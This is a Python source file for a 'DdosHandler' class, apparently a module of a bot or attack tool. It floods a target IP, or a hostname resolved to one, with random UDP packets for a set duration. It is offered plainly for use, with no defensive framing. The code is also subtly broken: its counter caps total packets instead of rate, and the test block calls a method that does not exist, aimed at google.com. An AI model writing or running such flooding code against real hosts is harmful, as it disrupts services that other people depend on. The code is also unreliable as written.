import os
import random

import socket
import time

from objects.Logger import Logger


class DdosHandler:
    MAX_REQUESTS_PER_SECOND = int(os.getenv("MAX_REQUESTS_PER_SECOND", 30))
    DDOS_PORT = int(os.getenv("DDOS_PORT", 0))

    def __init__(self, task_id: str):
        self.task_id = task_id
        self.logger = Logger()

    def start_ddos_to_ip(self, ip: str, duration: int):
        """
        DDos a target for a given amount of time.
        :param ip: IP of a target
        :param duration: duration of time in seconds.
        :return: None
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        counter = 0
        start_time = time.time()
        port = self.DDOS_PORT if self.DDOS_PORT != 0 else random.randint(1, 65534)  # chooses a random port if not chosen
        while time.time() - start_time <= duration and counter < self.MAX_REQUESTS_PER_SECOND:
            sock.sendto(random.randbytes(1000), (ip, port))
            counter += 1
        print(f"DDos command finished: {counter} requests sent.")

    def start_ddos_to_url(self, url: str, duration):
        """
        DDos a target of a given amount of time.
        :param url: URL of a target.
        :param duration: duration of time is seconds.
        :return: None
        """
        ip = socket.gethostbyname(url)
        self.start_ddos_to_ip(ip=ip, duration=duration)


if __name__ == '__main__':
    test_handler = DdosHandler("test")
    test_handler.send_request("google.com", "get")
